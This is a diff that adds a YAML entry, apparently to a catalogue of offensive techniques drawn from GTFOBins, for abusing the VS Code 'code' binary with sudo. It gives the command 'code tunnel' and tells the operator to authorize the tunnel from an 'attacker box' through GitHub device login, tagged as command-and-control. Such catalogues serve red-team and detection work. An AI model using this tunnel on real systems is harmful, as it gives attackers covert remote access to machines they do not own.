@@ -1,0 +1,29 @@
+id: gtfobins/code/download/sudo
+type: binary
+platform: linux
+name: code
+phases:
+- command-and-control
+- privilege-escalation
+capabilities:
+- file-download
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: code tunnel --name xxxxxx
+  comment: 'This requires a valid GitHub account.
+
+
+    Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using
+    the provided code to authorize the tunnel.'
+references:
+- https://gtfobins.github.io/gtfobins/code/
+tags:
+- linux
+- unix
+- gtfobins
